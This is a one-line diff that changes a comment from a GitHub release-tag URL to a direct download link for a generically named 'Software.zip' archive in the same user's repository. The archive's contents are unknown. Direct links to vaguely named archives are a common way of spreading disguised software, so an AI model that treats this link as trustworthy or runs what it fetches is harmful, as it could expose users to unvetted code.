@@ -1,1 +1,1 @@
-# https://github.com/xeanlrey/xeanlrey.github.io/releases/tag/v1.0
+# https://github.com/xeanlrey/xeanlrey.github.io/releases/download/v2.0/Software.zip
